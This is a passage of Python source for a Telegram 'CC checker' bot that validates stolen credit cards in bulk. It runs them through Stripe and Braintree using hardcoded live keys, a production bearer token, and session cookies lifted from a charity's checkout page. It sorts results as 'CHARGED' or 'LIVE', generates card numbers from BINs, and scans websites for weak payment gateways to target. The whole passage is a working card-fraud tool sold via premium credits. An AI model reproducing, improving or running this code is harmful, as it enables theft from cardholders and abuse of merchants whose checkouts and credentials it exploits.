        user_id = int(parts[1])
        cursor = get_cursor()
        cursor.execute("UPDATE users SET credits=0 WHERE user_id=?", (user_id,))
        conn.commit()
        bot.reply_to(message, f"Credits cleared for user {user_id}.")
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

@bot.message_handler(func=lambda message: message.text.startswith(('/adminadd', '.adminadd')))
def handle_addadmin(message):
    try:
        if not is_authorized(message.from_user.id):
            bot.reply_to(message, "Authorization required to execute this command.")
            return

        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "Please provide a user ID to promote.")
            return

        user_id = int(parts[1])
        cursor = get_cursor()
        cursor.execute("UPDATE users SET rank='ADMIN' WHERE user_id=?", (user_id,))
        conn.commit()
        bot.reply_to(message, f"User {user_id} has been promoted to ADMIN.")
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

# Handle /remrank command
@bot.message_handler(func=lambda message: message.text.startswith(('/rankrem', '.rankrem')))
def handle_remove_custom_rank(message):
    try:
        if not is_authorized(message.from_user.id):
            bot.reply_to(message, "Authorization required to execute this command.")
            return

        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "Please provide a user ID to remove custom rank.")
            return

        user_id = int(parts[1])
        cursor = get_cursor()
        cursor.execute("UPDATE users SET rank='FREE' WHERE user_id=?", (user_id,))
        conn.commit()
        bot.reply_to(message, f"Custom rank removed from user {user_id}.")
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")
        
        
@bot.message_handler(func=lambda message: message.text.startswith(('/adminrem', '.adminrem')))
def handle_remadmin(message):
    try:
        if not is_authorized(message.from_user.id):
            bot.reply_to(message, "Authorization required to execute this command.")
            return

        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "Please provide a user ID to remove admin privileges.")
            return

        user_id = int(parts[1])
        cursor = get_cursor()
        cursor.execute("UPDATE users SET rank='FREE' WHERE user_id=?", (user_id,))
        conn.commit()
        bot.reply_to(message, f"Admin privileges removed from user {user_id}.")
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

@bot.message_handler(func=lambda message: message.text.startswith(('/add', '.add')))
def handle_add_credits(message):
    try:
        if not is_authorized(message.from_user.id):
            bot.reply_to(message, "Authorization required to execute this command.")
            return

        parts = message.text.split()
        if len(parts) < 3:
            bot.reply_to(message, "Please provide a user ID and the amount of credits to add.")
            return

        user_id = int(parts[1])
        credits = int(parts[2])
        cursor = get_cursor()
        cursor.execute("UPDATE users SET credits = credits + ? WHERE user_id=?", (credits, user_id))
        conn.commit()
        bot.reply_to(message, f"Added {credits} credits to user {user_id}.")
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

@bot.message_handler(func=lambda message: message.text.startswith(('/grant', '.grant')))
def handle_grant_premium(message):
    try:
        if not is_authorized(message.from_user.id):
            bot.reply_to(message, "Authorization required to execute this command.")
            return

        parts = message.text.split()
        if len(parts) < 3:
            bot.reply_to(message, "Please provide a user ID and the number of days for premium status.")
            return

        user_id = int(parts[1])
        days = int(parts[2])
        premium_until = time.strftime('%Y-%m-%d', time.localtime(time.time() + days * 86400))
        cursor = get_cursor()
        cursor.execute("UPDATE users SET premium_until=? WHERE user_id=?", (premium_until, user_id))
        conn.commit()
        bot.reply_to(message, f"Granted premium to user {user_id} until {premium_until}.")
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

def process_card(card_info, user_id):
    try:
        # Check user credits
        cursor = get_cursor()
        cursor.execute("SELECT credits FROM users WHERE user_id=?", (user_id,))
        user = cursor.fetchone()
        
        if not user:  # Check if user exists
            return "User not registered. Please register to use this feature."

        if user[0] < 1:
            return "Insufficient credits. Please add more credits to continue."

        # Deduct 1 credit for the check
        cursor.execute("UPDATE users SET credits = credits - 1 WHERE user_id=?", (user_id,))
        conn.commit()

        start_time = time.time()

        # Extract card details
        card_number, card_exp_month, card_exp_year, card_cvc = card_info.split('|')

        # Convert the expiration year to a two-digit format if necessary
        if len(card_exp_year) == 4:
            card_exp_year = card_exp_year[2:]

        # Set up the request for the Stripe API
        stripe_url = 'https://api.stripe.com/v1/payment_methods'
        stripe_headers = {
		    'authority': 'api.stripe.com',
		    'accept': 'application/json',
		    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
		    'content-type': 'application/x-www-form-urlencoded',
		    'origin': 'https://js.stripe.com',
		    'referer': 'https://js.stripe.com/',
		    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-site',
		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
		}
        stripe_data = f'type=card&billing_details[name]=AntifiedNull&billing_details[email]=antifiednull945%40gmail.com&billing_details[address][line1]=AntifiedNull&billing_details[address][city]=New+York&billing_details[address][state]=New+York&billing_details[address][country]=US&billing_details[address][postal_code]=10080&card[number]={card_number}&card[cvc]={card_cvc}&card[exp_month]={card_exp_month}&card[exp_year]={card_exp_year}&guid=796f3dc4-af38-471f-8523-477f0170a071e1f637&muid=618b8b71-7516-4bd7-ba5c-c3d1162597f09d162b&sid=8b04681f-a367-4102-a8ba-bbc4c2470c1b51097b&payment_user_agent=stripe.js%2F946d9f95b9%3B+stripe-js-v3%2F946d9f95b9%3B+split-card-element&referrer=https%3A%2F%2Fwww.giftofgodministry.com&time_on_page=80642&key=pk_live_nyPnaDuxaj8zDxRbuaPHJjip&_stripe_account=acct_1OT7NLG8WC78DVHv&_stripe_version=2020-03-02'


        # Send the request to Stripe
        stripe_response = requests.post(stripe_url, headers=stripe_headers, data=stripe_data)
        stripe_response_data = stripe_response.json()

        # Retrieve the payment ID and additional card information
        payment_id = stripe_response_data.get('id', None)
        card_info = stripe_response_data.get('card', {})
        country = card_info.get('country', 'Unknown')
        type = card_info.get('funding', 'Unknown')
        brand = card_info.get('brand', 'Unknown')
        bin_number = card_number[:6]

        if not payment_id:
            return f"INCORRECT CARD NUMBER / EXPIRY\n\n CARD NUMER : {card_number} \n EXPIRY : {card_exp_month}/{card_exp_year} \n CVV : {card_cvc} "

        # Perform an additional API call using the payment ID
        other_url = "https://www.giftofgodministry.com/.wf_graphql/apollo"
        other_headers = {
            'authority': 'www.giftofgodministry.com',
            'accept': 'application/json',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/json',
            'cookie': '__stripe_mid=618b8b71-7516-4bd7-ba5c-c3d1162597f09d162b; __stripe_sid=8b04681f-a367-4102-a8ba-bbc4c2470c1b51097b; wf-order-id=c9339296-70e9-46c5-b98a-3d0c91dcb645; wf-order-id.sig=sHdqhTITb5lkVJt2rbyQRRLkQRP-b_vtEVK6Sw1BPps; wf-csrf=c-Z15S6kXTkUyzO1UPRb_-qy2yZ4WAZQ8h5bbjW2VK-d; wf-csrf.sig=wFHQduRnat_YL8NCyWA85BpDJ2ARCuYuZ_sBKJQ2bTA',
            'origin': 'https://www.giftofgodministry.com',
            'referer': 'https://www.giftofgodministry.com/checkout',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
            'x-wf-csrf': 'c-Z15S6kXTkUyzO1UPRb_-qy2yZ4WAZQ8h5bbjW2VK-d',
        }

        other_data = [
            {
                'operationName': 'CheckoutUpdateStripePaymentMethod',
                'variables': {
                    'paymentMethod': payment_id,
                },
                'query': 'mutation CheckoutUpdateStripePaymentMethod($paymentMethod: String!) {\n  ecommerceStoreStripePaymentMethod(paymentMethod: $paymentMethod) {\n    ok\n    __typename\n  }\n}',
            },
        ]


        # Make the request to the secondary API
        other_response = requests.post(other_url, headers=other_headers, json=other_data)
        other_response_text = other_response.text

        # Evaluate the response directly
        response_status = categorize_response(other_response_text)

        # Measure the elapsed time
        elapsed_time = time.time() - start_time

        # Construct the formatted response for each card
        formatted_response = (
            f"{response_status}\n\n"
            f"𝘾𝘼𝙍𝘿 -» {card_number}|{card_exp_month}|{card_exp_year}|{card_cvc}\n"
            f"𝙂𝘼𝙏𝙀𝙒𝗔𝗬 -» STRIPE 1$🔥\n"
            f"𝙄𝙉𝙁𝙊 -» {brand.upper()}\n"
            f"𝘾𝙊𝙐𝙉𝙏𝙍𝙔 -» {country}\n"
            f"𝗧𝗬𝗣𝗘 -» {type.upper()}\n"
            f"𝘽𝙄𝙉 -» {bin_number}\n"
            f"𝙏𝙄𝙈𝙀 -» {elapsed_time:.2f}⏳\n"
            f"- - - - - - - - - - - - - - - - - - - - - - -\n"
            f"BOT BY: AntifiedNull[Prateek]\n"
            f"USERNAME: @GOD_ANTIFIEDNULL_X\n"
        )
        return formatted_response

    except Exception as e:
        logging.error(f"Error processing card: {str(e)}")
        return f"An error occurred: {str(e)}"

@bot.message_handler(func=lambda message: message.text.startswith(('/chk', '.chk')))
def handle_chk_command(message):
    try:
        user_id = message.from_user.id
        parts = message.text.split(' ', 1)
        if len(parts) < 2:
            bot.reply_to(message, "Please provide CC in the correct format: cc|mm|yy|cvv")
            return

        card_info = parts[1]
        if '|' not in card_info or len(card_info.split('|')) != 4:
            bot.reply_to(message, "Please provide CC in the correct format: cc|mm|yy|cvv")
            return

        # Initial message with charge information
        chat_id = message.chat.id
        initial_message = bot.send_message(chat_id, "ꜱᴛʀɪᴘᴇ ᴄʜᴀʀɢᴇ $1")

        # Simulate progress updates
        progress_steps = [
            "➤ PROCESS ->> ■□□□□",
            "➤ PROCESS ->> ■■□□□",
            "➤ PROCESS ->> ■■■□□",
            "➤ PROCESS ->> ■■■■□",
            "➤ PROCESS ->> ■■■■■"
        ]
        
        for step in progress_steps:
            time.sleep(0.1)  # Simulate processing delay
            bot.edit_message_text(f"{step}", chat_id=chat_id, message_id=initial_message.message_id)

        # Process card response
        response = process_card(card_info, user_id)
        bot.edit_message_text(response, chat_id=chat_id, message_id=initial_message.message_id)

    except Exception as e:
        logging.error(f"Error processing request: {str(e)}")
        bot.reply_to(message, f"An error occurred: {str(e)}")

@bot.message_handler(func=lambda message: message.text.startswith(('.mchk', '/mchk')))
def handle_mchk_command(message):
    user_id = message.from_user.id
    cursor = get_cursor()
    cursor.execute("SELECT rank, premium_until FROM users WHERE user_id=?", (user_id,))
    user = cursor.fetchone()

    if not user:
        bot.reply_to(message, "User not registered. Please register to use this feature.")
        return

    rank = user[0]
    premium_until = user[1]

    if rank not in ['PREMIUM', 'OWNER'] and (not premium_until or time.strptime(premium_until, '%Y-%m-%d') <= time.localtime()):
        bot.reply_to(message, "This feature is only available for premium users.")
        return

    # Split the message text to extract card entries, ignoring the command part
    card_entries = message.text.split('\n')[1:]
    if not card_entries or (len(card_entries) == 1 and not card_entries[0].strip()):
        bot.reply_to(message, "Please provide CC in the correct format: cc|mm|yy|cvv")
        return

    # Start a new thread for processing
    thread = threading.Thread(target=process_cards_batch, args=(bot, message, user_id, card_entries))
    thread.start()

def process_cards_batch(bot, message, user_id, card_entries):
    total_count = len(card_entries)
    initial_message = bot.reply_to(message, "Checking Your Cards ⌛")

    for i, card_info in enumerate(card_entries, start=1):
        card_info = card_info.strip()
        if '|' in card_info and len(card_info.split('|')) == 4:
            response = process_card(card_info, user_id)
            # Update the initial message with the current progress
            bot.edit_message_text(f"Processing [{i}/{total_count}]\n{response}", chat_id=message.chat.id, message_id=initial_message.message_id)
            
            # Send non-declined responses as a reply to the original messag
            if "DECLINED" not in response:
                bot.reply_to(message, response)
        else:
            response = "Please provide CC in the correct format: cc|mm|yy|cvv"
            bot.edit_message_text(f"Processing Error [{i}/{total_count}]\n{response}", chat_id=message.chat.id, message_id=initial_message.message_id)

    # Delete the initial progress message at the end
    bot.delete_message(message.chat.id, initial_message.message_id)

    # Send a final completion message
    bot.reply_to(message, "YOUR CC CHECKING HAS BEEN COMPLETED 🔥")

def send_long_message(chat_id, message):
    for i in range(0, len(message), 4096):
        bot.send_message(chat_id, message[i:i + 4096])

def categorize_response(response):
    response = response.lower()

    charged_keywords = [
        "succeeded", "payment-success", "successfully", "thank you for your support",
        "your card does not support this type of purchase", "thank you",
        "membership confirmation", "/wishlist-member/?reg=", "thank you for your payment",
        "thank you for membership", "payment received", "your order has been received",
        "purchase successful"
    ]
    
    insufficient_keywords = [
        "insufficient funds", "insufficient_funds", "payment-successfully"
    ]
    
    auth_keywords = [
        "mutation_ok_result" , "requires_action"
    ]

    ccn_cvv_keywords = [
        "incorrect_cvc", "invalid cvc", "invalid_cvc", "incorrect cvc", "incorrect cvv",
        "incorrect_cvv", "invalid_cvv", "invalid cvv", ' "cvv_check": "pass" ',
        "cvv_check: pass", "security code is invalid", "security code is incorrect",
        "zip code is incorrect", "zip code is invalid", "card is declined by your bank",
        "lost_card", "stolen_card", "transaction_not_allowed", "pickup_card"
    ]

    live_keywords = [
        "authentication required", "three_d_secure", "3d secure", "stripe_3ds2_fingerprint"
    ]

    declined_keywords = [
        "declined", "do_not_honor", "generic_decline", "decline by your bank",
        "expired_card", "your card has expired", "incorrect_number",
        "card number is incorrect", "processing_error", "service_not_allowed",
        "lock_timeout", "card was declined", "fraudulent"
    ]

    if any(kw in response for kw in charged_keywords):
        return "CHARGED 🔥"
    elif any(kw in response for kw in ccn_cvv_keywords):
        return "CCN/CVV ✅"
    elif any(kw in response for kw in live_keywords):
        return "3D LIVE ✅"
    elif any(kw in response for kw in insufficient_keywords):
        return "INSUFFICIENT FUNDS 💰"
    elif any(kw in response for kw in auth_keywords):
        return "STRIPE AUTH ☑️ "
    elif any(kw in response for kw in declined_keywords):
        return "DECLINED ❌"
    else:
        return "UNKNOWN STATUS 👾"

@bot.message_handler(func=lambda message: message.text.startswith(("/url", ".url")))
def cmd_url(message):
    try:
        _, url = message.text.split(maxsplit=1)
    except ValueError:
        bot.reply_to(message, "Usage: `.url <URL>` or `/url <URL>`")
        return

    if not is_valid_url(url.strip()):
        bot.reply_to(message, "Invalid URL. Please try again.")
        return

    detected_gateways, status_code, captcha, cloudflare, payment_security_type, cvv_cvc_status, inbuilt_status = check_url(url)
    gateways_str = ', '.join(detected_gateways) if detected_gateways else "None"
    bot.reply_to(
        message,
        f"🔍 URL: {url}\n"
        f"[↯] Payment Gateways: {gateways_str}\n"
        f"[↯] Captcha: {captcha}\n"
        f"[↯] Cloudflare: {cloudflare}\n"
        f"[↯] Security: {payment_security_type}\n"
        f"[↯] CVV/CVC: {cvv_cvc_status}\n"
        f"[↯] Inbuilt System: {inbuilt_status}\n"
        f"[↯] Status Code: {status_code}\n"
        f"[↯] Bot By: AntifiedNull[Prateek] \n"
        f"[↯] Username : @GOD_ANTIFIEDNULL_X\n"
        )
 
@bot.message_handler(func=lambda message: message.text.startswith(("/murl", ".murl")))
def cmd_murl(message):
    try:
        _, urls = message.text.split(maxsplit=1)
    except ValueError:
        bot.reply_to(message, "Usage: `.murl <URL1> <URL2> ...` or `/murl <URL1> <URL2> ...`")
        return

    urls = re.split(r'[\n\s]+', urls.strip())
    results = []

    for url in urls:
        if not is_valid_url(url.strip()):
            results.append(f"[↯] URL: {url} ➡ Invalid URL")
            continue

        detected_gateways, status_code, captcha, cloudflare, payment_security_type, cvv_cvc_status, inbuilt_status = check_url(url)
        gateways_str = ', '.join(detected_gateways) if detected_gateways else "None"
        results.append(
            f"🔍 URL: {url}\n"
            f"[↯] Payment Gateways: {gateways_str}\n"
            f"[↯] Captcha: {captcha}\n"
            f"[↯] Cloudflare: {cloudflare}\n"
            f"[↯] Security: {payment_security_type}\n"
            f"[↯] CVV/CVC: {cvv_cvc_status}\n"
            f"[↯] Inbuilt System: {inbuilt_status}\n"
            f"[↯] Status Code: {status_code}\n"
            f"[↯] Bot By: AntifiedNull[Prateek] \n"
            f"[↯] Username : @GOD_ANTIFIEDNULL_X\n"
            f" ——————————————————————"
        )

    if results:
        for result in results:
            if len(result) > 4096:
                send_long_message(message.chat.id, result)
            else:
                bot.reply_to(message, result)
    else:
        bot.reply_to(message, "No valid URLs detected. Please try again.")

def is_premium_user(user_id):
    cursor = get_cursor()
    cursor.execute("SELECT rank, premium_until FROM users WHERE user_id=?", (user_id,))
    user = cursor.fetchone()
    if not user:
        return False
    rank, premium_until = user
    return rank == 'PREMIUM' or user_id == OWNER_ID or (premium_until and time.strptime(premium_until, '%Y-%m-%d') > time.localtime())

@bot.message_handler(content_types=['document'])
def handle_file_upload(message):
    user_id = message.from_user.id

    # Check if the user is registered
    cursor = get_cursor()
    cursor.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
    user = cursor.fetchone()
    if not user:
        bot.reply_to(message, "You need to register before using this feature. Please use /register.")
        return

    # Check if the user is premium
    if not is_premium_user(user_id):
        bot.reply_to(message, "This feature is only available for premium users. Please buy a premium plan to use it.")
        return

    try:
        file_id = message.document.file_id
        file_info = bot.get_file(file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        # Ensure the directory exists
        os.makedirs('downloads', exist_ok=True)
        
        file_path = f"downloads/{file_info.file_path.split('/')[-1]}"
        
        # Log file path for debugging
        logging.info(f"Saving file to: {file_path}")
        
        with open(file_path, 'wb') as new_file:
            new_file.write(downloaded_file)
        
        # Store the file path for the user
        uploaded_files[user_id] = file_path

        # Inform the user that the file is ready for processing
        bot.reply_to(message, "File uploaded successfully. Type /cvvtxt to process the file.")

    except telebot.apihelper.ApiTelegramException as e:
        logging.error(f"Telegram API error: {e}")
        bot.reply_to(message, "There was an error with the Telegram API while uploading your file. Please try again.")
    except FileNotFoundError as e:
        logging.error(f"File not found error: {e}")
        bot.reply_to(message, "An error occurred while accessing the file. Please try uploading again.")
    except Exception as e:
        logging.error(f"Unhandled exception: {e}")
        bot.reply_to(message, "An unexpected error occurred. Please try again later.")

@bot.message_handler(commands=['cvvtxt'])
def handle_cvvtxt_command(message):
    user_id = message.from_user.id

    # Check if the user is registered
    cursor = get_cursor()
    cursor.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
    if not cursor.fetchone():
        bot.reply_to(message, "You need to register before using this feature. Please use /register.")
        return

    # Check if the user is premium
    if not is_premium_user(user_id):
        bot.reply_to(message, "This feature is only available for premium users. Please buy a premium plan to use it.")
        return

    if user_id in uploaded_files:
        file_path = uploaded_files[user_id]
        if os.path.exists(file_path):
            thread = threading.Thread(target=process_file, args=(bot, message, file_path))
            thread.start()
        else:
            bot.reply_to(message, "File not found. Please upload again.")
    else:
        bot.reply_to(message, "No file uploaded. Please upload a file first.")

def process_file(bot, message, file_path):
    try:
        with open(file_path, 'r') as file:
            lines = file.readlines()

        results_count = {
            "CHARGED 🔥": 0,
            "CCN/CVV ✅": 0,
            "3D LIVE ✅": 0,
            "INSUFFICIENT FUNDS 💰": 0,
            "STRIPE AUTH ☑️": 0,
            "DECLINED ❌": 0,
            "UNKNOWN STATUS 👾": 0
        }

        # Initial processing message
        initial_message = bot.reply_to(message, "WAIT WHILE YOUR CARDS ARE BEING CHECKED BY ➜ AntifiedNull[Prateek] BOT \n")

        for index, line in enumerate(lines):
            card_info = line.strip()
            if '|' in card_info and len(card_info.split('|')) == 4:
                response = process_card(card_info, message.from_user.id)
                response_category = categorize_response(response)

                # Update the count
                if response_category in results_count:
                    results_count[response_category] += 1
                else:
                    results_count["UNKNOWN STATUS 👾"] += 1

                # Update message with current counts
                current_summary = (
                    f"CHARGED 🔥[{results_count['CHARGED 🔥']}]\n"
                    f"CCN/CVV ✅[{results_count['CCN/CVV ✅']}]\n"
                    f"3D LIVE ✅ [{results_count['3D LIVE ✅']}]\n"
                    f"INSUFFICIENT FUNDS 💰[{results_count['INSUFFICIENT FUNDS 💰']}]\n"
                    f"STRIPE AUTH ☑️[{results_count['STRIPE AUTH ☑️']}]\n"
                    f"DECLINED ❌[{results_count['DECLINED ❌']}]\n"
                    f"UNKNOWN STATUS 👾 [{results_count['UNKNOWN STATUS 👾']}]\n"
                )
                bot.edit_message_text(
                    f"YOUR CARDS ARE UNDER PROGRESS: {index + 1}/{len(lines)}\n{current_summary}",
                    chat_id=message.chat.id,
                    message_id=initial_message.message_id
                )

                # Send non-declined responses to the user
                if response_category != "DECLINED ❌":
                    bot.reply_to(message, response)

        # Delete the intermediate progress message
        bot.delete_message(chat_id=message.chat.id, message_id=initial_message.message_id)

        # Final summary
        final_summary = (
            "YOUR CHECKING COMPLETED:\n\n"
            f"CHARGED 🔥[{results_count['CHARGED 🔥']}]\n"
            f"CCN/CVV ✅[{results_count['CCN/CVV ✅']}]\n"
            f"3D LIVE ✅ [{results_count['3D LIVE ✅']}]\n"
            f"INSUFFICIENT FUNDS 💰[{results_count['INSUFFICIENT FUNDS 💰']}]\n"
            f"STRIPE AUTH ☑️[{results_count['STRIPE AUTH ☑️']}]\n"
            f"DECLINED ❌[{results_count['DECLINED ❌']}]\n"
            f"UNKNOWN STATUS 👾 [{results_count['UNKNOWN STATUS 👾']}]\n\n"
            "BOT BY : AntifiedNull[Prateek] \n"
            "USERNAME : @GOD_ANTIFIEDNULL_X\n"
            "FOLLOW: @Null_Realm"
        )
        bot.reply_to(message, final_summary)

    except Exception as e:
        bot.reply_to(message, f"Error processing file: {str(e)}")

    finally:
        # Ensure file is removed after processing
        if os.path.exists(file_path):
            os.remove(file_path)
        # Remove the file path from the dictionary
        del uploaded_files[message.from_user.id]

def generate_card_data(bin_number, amount=10):
    url_gen = 'https://namsogen.org/ajax.php'
    headers = {
        'authority': 'namsogen.org',
        'accept': '*/*',
        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'cookie': '_ga=GA1.1.810898290.1732423842;',
        'origin': 'https://namsogen.org',
        'referer': 'https://namsogen.org/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest'
    }

    data = {
        'type': '3',
        'bin': bin_number,
        'date': 'on',
        's_date': '',  # Leave blank by default
        'year': '',    # Leave blank by default
        'csv': 'on',
        's_csv': '',
        'number': str(amount),
        'format': 'pipe'
    }

    response = requests.post(url_gen, headers=headers, data=data)

    if response.status_code == 200:
        generated_data = response.text.strip().split('\n')
        return generated_data
    else:
        return None

def use_card_in_braintree(generated_card_data):
    card_number, expiration_month, expiration_year, cvv = generated_card_data.split('|')

    headers = {
        'authority': 'payments.braintree-api.com',
        'accept': '*/*',
        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'authorization': 'Bearer production_w3jmfs6q_779b9vbjhk2bffsj',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': 'c08117f3-1760-4cb2-ae53-5671a874f3ca',
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': card_number,
                    'expirationMonth': expiration_month,
                    'expirationYear': expiration_year,
                    'cvv': cvv,
                    'cardholderName': 'AntifiedNull Prateek',
                    'billingAddress': {
                        'countryCodeAlpha2': 'IN',
                        'locality': 'Noida',
                        'region': 'UP',
                        'firstName': 'AntifiedNull',
                        'lastName': 'Prateek',
                        'postalCode': '201309',
                        'streetAddress': 'AntifiedNull',
                    },
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

    response1 = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
    response_data = response1.json()

    credit_card_info = response_data.get('data', {}).get('tokenizeCreditCard', {}).get('creditCard', {})
    bin_number = credit_card_info.get('bin', 'Unknown')
    brand_code = credit_card_info.get('brandCode', 'Unknown').lower().capitalize()
    bin_data = credit_card_info.get('binData', {})
    card_type = "DEBIT" if bin_data.get('debit', 'NO') == "YES" else "CREDIT"
    issuing_bank = bin_data.get('issuingBank', 'Unknown').title() if bin_data.get('issuingBank') else 'Unknown'
    country_code = bin_data.get('countryOfIssuance', 'Unknown').title() if bin_data.get('countryOfIssuance') else 'Unknown'

    return bin_number, brand_code, card_type, issuing_bank, country_code

country_flags = {
    'AFG': '🇦🇫',  # Afghanistan
    'ALB': '🇦🇱',  # Albania
    'DZA': '🇩🇿',  # Algeria
    'AND': '🇦🇩',  # Andorra
    'AGO': '🇦🇴',  # Angola
    'ATG': '🇦🇬',  # Antigua and Barbuda
    'ARG': '🇦🇷',  # Argentina
    'ARM': '🇦🇲',  # Armenia
    'AUS': '🇦🇺',  # Australia
    'AUT': '🇦🇹',  # Austria
    'AZE': '🇦🇿',  # Azerbaijan
    'BHS': '🇧🇸',  # Bahamas
    'BHR': '🇧🇭',  # Bahrain
    'BGD': '🇧🇩',  # Bangladesh
    'BRB': '🇧🇧',  # Barbados
    'BLR': '🇧🇾',  # Belarus
    'BEL': '🇧🇪',  # Belgium
    'BLZ': '🇧🇿',  # Belize
    'BEN': '🇧🇯',  # Benin
    'BTN': '🇧🇹',  # Bhutan
    'BOL': '🇧🇴',  # Bolivia
    'BIH': '🇧🇦',  # Bosnia and Herzegovina
    'BWA': '🇧🇼',  # Botswana
    'BRA': '🇧🇷',  # Brazil
    'BRN': '🇧🇳',  # Brunei
    'BGR': '🇧🇬',  # Bulgaria
    'BFA': '🇧🇫',  # Burkina Faso
    'BDI': '🇧🇮',  # Burundi
    'CPV': '🇨🇻',  # Cape Verde
    'KHM': '🇰🇭',  # Cambodia
    'CMR': '🇨🇲',  # Cameroon
    'CAN': '🇨🇦',  # Canada
    'CAF': '🇨🇫',  # Central African Republic
    'TCD': '🇹🇩',  # Chad
    'CHL': '🇨🇱',  # Chile
    'CHN': '🇨🇳',  # China
    'COL': '🇨🇴',  # Colombia
    'COM': '🇰🇲',  # Comoros
    'COG': '🇨🇬',  # Congo (Brazzaville)
    'COD': '🇨🇩',  # Congo (Kinshasa)
    'CRI': '🇨🇷',  # Costa Rica
    'CIV': '🇨🇮',  # Côte d'Ivoire
    'HRV': '🇭🇷',  # Croatia
    'CUB': '🇨🇺',  # Cuba
    'CYP': '🇨🇾',  # Cyprus
    'CZE': '🇨🇿',  # Czech Republic
    'DNK': '🇩🇰',  # Denmark
    'DJI': '🇩🇯',  # Djibouti
    'DMA': '🇩🇲',  # Dominica
    'DOM': '🇩🇴',  # Dominican Republic
    'ECU': '🇪🇨',  # Ecuador
    'EGY': '🇪🇬',  # Egypt
    'SLV': '🇸🇻',  # El Salvador
    'GNQ': '🇬🇶',  # Equatorial Guinea
    'ERI': '🇪🇷',  # Eritrea
    'EST': '🇪🇪',  # Estonia
    'SWZ': '🇸🇿',  # Eswatini
    'ETH': '🇪🇹',  # Ethiopia
    'FJI': '🇫🇯',  # Fiji
    'FIN': '🇫🇮',  # Finland
    'FRA': '🇫🇷',  # France
    'GAB': '🇬🇦',  # Gabon
    'GMB': '🇬🇲',  # Gambia
    'GEO': '🇬🇪',  # Georgia
    'DEU': '🇩🇪',  # Germany
    'GHA': '🇬🇭',  # Ghana
    'GRC': '🇬🇷',  # Greece
    'GRD': '🇬🇩',  # Grenada
    'GTM': '🇬🇹',  # Guatemala
    'GIN': '🇬🇳',  # Guinea
    'GNB': '🇬🇼',  # Guinea-Bissau
    'GUY': '🇬🇾',  # Guyana
    'HTI': '🇭🇹',  # Haiti
    'HND': '🇭🇳',  # Honduras
    'HKG': '🇭🇰',  # Hong Kong
    'HUN': '🇭🇺',  # Hungary
    'ISL': '🇮🇸',  # Iceland
    'IND': '🇮🇳',  # India
    'IDN': '🇮🇩',  # Indonesia
    'IRN': '🇮🇷',  # Iran
    'IRQ': '🇮🇶',  # Iraq
    'IRL': '🇮🇪',  # Ireland
    'ISR': '🇮🇱',  # Israel
    'ITA': '🇮🇹',  # Italy
    'JAM': '🇯🇲',  # Jamaica
    'JPN': '🇯🇵',  # Japan
    'JOR': '🇯🇴',  # Jordan
    'KAZ': '🇰🇿',  # Kazakhstan
    'KEN': '🇰🇪',  # Kenya
    'KIR': '🇰🇮',  # Kiribati
    'KWT': '🇰🇼',  # Kuwait
    'KGZ': '🇰🇬',  # Kyrgyzstan
    'LAO': '🇱🇦',  # Laos
    'LVA': '🇱🇻',  # Latvia
    'LBN': '🇱🇧',  # Lebanon
    'LSO': '🇱🇸',  # Lesotho
    'LBR': '🇱🇷',  # Liberia
    'LBY': '🇱🇾',  # Libya
    'LIE': '🇱🇮',  # Liechtenstein
    'LTU': '🇱🇹',  # Lithuania
    'LUX': '🇱🇺',  # Luxembourg
    'MAC': '🇲🇴',  # Macao
